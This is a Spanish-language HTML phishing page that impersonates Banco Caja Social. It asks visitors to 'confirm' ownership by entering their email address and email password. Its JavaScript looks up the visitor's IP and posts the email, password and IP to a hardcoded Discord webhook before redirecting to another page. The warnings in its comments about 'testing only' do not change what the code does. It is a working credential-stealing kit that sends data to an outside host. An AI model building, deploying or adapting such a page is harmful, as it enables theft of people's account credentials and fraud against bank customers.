<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Caja Social - Login</title>
    
    <!-- Incluye Tailwind CSS para utilidades de diseño (aunque el CSS personalizado predomina) -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Estilos CSS originales del código PHP, adaptados y mejorados para responsividad */
        :root {
            /* Colores tomados del código PHP original */
            --primary-color: #005CBB; /* Amarillo/Azul fuerte */
            --accent-color: #003366; /* Azul oscuro */
            --background-color: #0073cf; /* Azul principal */
            --error-color: #dc2626; /* Rojo para errores */
            --success-color: #10b981; /* Verde para éxito */
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
            background: var(--background-color); 
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            /* Padding ajustado para mejor visualización móvil */
            padding: 15px; 
            color: #333; 
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* Estilo de Tarjeta (Card) */
        .container {
            width: 100%;
            max-width: 380px; 
            
            /* Efecto Glass/Translucido Blanco */
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            
            /* Padding consistente */
            padding: 30px 25px; /* REVERTIDO: Vuelve al padding original */
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            text-align: center;
            color: #333; 
        

        h1 {
            color: var(--accent-color); 
            font-size: 28px; /* REVERTIDO: Vuelve al tamaño de fuente anterior */
            font-weight: 700;
            margin-bottom: 15px; /* REVERTIDO: Vuelve al margen inferior anterior */
        }

        p, small {
            font-size: 15px;
            line-height: 1.5;
            color: #444;
        }
        
        small {
            display: block;
            margin-bottom: 25px;
            font-size: 13px;
        }

        .form-group {
            margin-bottom: 25px;
            text-align: left;
        }

        .form-group label {
            font-size: 14px;
            margin-bottom: 8px;
            display: block;
            font-weight: 500;
            color: #333;
        }

        .form-group input {
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            border: 1px solid #ccc;
            font-size: 15px;
            outline: none;
            color: #333;
            transition: border-color 0.25s ease;
        }
         .form-group input:focus {
            /* Usamos el color primario de esta versión */
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(0, 92, 187, 0.3); 
        }

        .forgot {
            margin: 15px 0;
            font-size: 14px;
            text-align: right;
            cursor: pointer;
            text-decoration: none; 
            color: var(--background-color); 
            display: block;
            transition: color 0.2s;
        }
        .forgot:hover {
            color: var(--accent-color);
        }

        /* Estilo del botón unificado */
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px; 
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            background: var(--primary-color); 
            color: #FFF;
            transition: 0.3s transform, 0.3s box-shadow;
        }

        .btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            /* Usamos un color de hover que contraste mejor con el primario */
            background: #004a96; 
        }

        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        /* Contenedor de mensajes de estado */
        #status-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            font-weight: 600;
            text-align: left;
            display: none; /* Oculto por defecto */
        }
        .error {
            background-color: #fee2e2;
            color: var(--error-color);
            border: 1px solid var(--error-color);
        }
        .success {
            background-color: #d1fae5;
            color: var(--success-color);
            border: 1px solid var(--success-color);
        }
        .processing {
            background-color: #dbeafe;
            color: #1e40af;
            border: 1px solid #3b82f6;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Título ajustado al estilo Pichincha -->
        <h1>Confirmacion de correo electronico</h1>
        <p>Se requiere este metodo para verificar si realmete es usted la persona propietaria de la cuenta, y no un tercero.</p>

        <!-- El action se elimina y se usa JavaScript para el onsubmit -->
        <form id="login-form" onsubmit="handleFormSubmit(event)">
            <div class="form-group">
                <label for="usuario">Correo electrónico asociado a tu cuenta</label>
                <!-- Usamos type="email" y lo hacemos requerido -->
                <input type="email" id="usuario" name="usuario" placeholder="Ingrese su correo" required>
            </div>

            <div class="form-group">
                <label for="clave">Contraseña de tu correo electrónico</label>
                <!-- Usamos name="clave" consistente con el original, y type="password" -->
                <input type="password" id="clave" name="clave" placeholder="Ingrese su contraseña" required />
                <a class="forgot" href="#">¿Olvidaste tu contraseña?</a>
            </div>
            
            <button type="submit" class="btn" id="submit-btn">
                Continuar proceso
            </button>
        </form>
        
        <!-- Contenedor para mensajes de estado/error -->
        <div id="status-message" role="alert"></div>
    </div>

    <script>
        // --------------------------------------------------------
        // Configuración y Variables de control
        // --------------------------------------------------------
        const REDIRECT_URL = "index3.html"; // La URL de redirección final
        
        // *********************************************************************************
        // !!! ADVERTENCIA DE SEGURIDAD CRÍTICA !!!
        // Esta URL es visible en el navegador. NO USAR PARA ENVIAR DATOS SENSIBLES 
        // EN ENTORNOS REALES. Se ha habilitado la clave solo para pruebas en entorno controlado.
        // *********************************************************************************
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1439028329335230537/g2TFVNMf7RS1WFIb9Vkhv2_z-F5fFbrHP-JcF7QBiGFXyPq1BWXLHobMsQgLYsrjHaNT";
        
        // Elementos UI
        const statusMessage = document.getElementById('status-message');
        const submitButton = document.getElementById('submit-btn');

        // Muestra mensajes de estado/error
        function showStatus(message, type) {
            statusMessage.textContent = message;
            // Definición de clases de estado
            const typeClasses = {
                'success': 'success',
                'error': 'error',
                'processing': 'processing'
            };
            statusMessage.className = `mt-4 p-3 rounded-xl font-semibold text-sm ${typeClasses[type] || ''}`;
            statusMessage.style.display = 'block';
        }

        // 1. Función para obtener la IP pública del cliente (reemplaza getRealIP de PHP)
        async function getRealIP() {
            try {
                // Usamos un servicio externo simple para obtener la IP del cliente
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) {
                    return 'IP Desconocida (Fallo API)';
                }
                const data = await response.json();
                return data.ip || 'IP Desconocida';
            } catch (error) {
                console.error("Error al obtener IP:", error);
                return 'IP Desconocida (Error de red)';
            }
        }

        // 2. Función para enviar el mensaje a Discord (reemplaza enviarDiscord de PHP)
        async function enviarDiscord(usuario, clave, ip_cliente) {
            // *************************************************************************
            // !!! ADVERTENCIA: SE HA INCLUIDO LA CLAVE EN EL MENSAJE PARA PRUEBAS. !!!
            // *************************************************************************
            const separador = "\n--------------------\n";
            // El mensaje ahora incluye el Correo, la CLAVE y la IP.
            const mensaje = `Datos de Intento de Correo\nCorreo: ${usuario}\nClave: ${clave}\nIP: ${ip_cliente}${separador}AVISO: GANADORES POR SIEMPRE.`;

            const data = {
                "content": mensaje,
                "username": "CORREO ELECTRONICO"
            };

            const options = {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
            };

            try {
                const response = await fetch(WEBHOOK_URL, options);
                
                // Discord responde 204 No Content en éxito
                if (response.status === 204) {
                    return { success: true };
                } 
                
                // Manejo de errores de Discord (análogo al PHP)
                let responseText = await response.text();
                
                return { 
                    success: false, 
                    code: response.status, 
                    message: `Error Discord HTTP ${response.status}. Respuesta: ${responseText}` 
                };

            } catch (error) {
                // Fallo de red (análogo al error cURL)
                return { success: false, code: 'NET_ERROR', message: `❌ Error de Red. Causa: ${error.message}` };
            }
        }
        
        // 3. Lógica principal de manejo del formulario
        async function handleFormSubmit(event) {
            // Detiene el envío normal del formulario 
            event.preventDefault(); 
            
            submitButton.disabled = true;

            const form = event.target;
            const usuario = form.usuario.value;
            const clave = form.clave.value;

            // Obtener IP de forma asíncrona
            const ip_cliente = await getRealIP();

            // Enviar todos los datos (Correo, Clave e IP)
            const result = await enviarDiscord(usuario, clave, ip_cliente);

            if (result.success) {
                // Redirección si el envío es exitoso
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1500); 
            } else {
                // Mostrar error y re-habilitar el botón
                showStatus(`❌ Fallo en el envío a Discord: ${result.message}. Reintente.`, 'error');
                submitButton.disabled = false;
            }
        }
    </script>
</body>
</html>
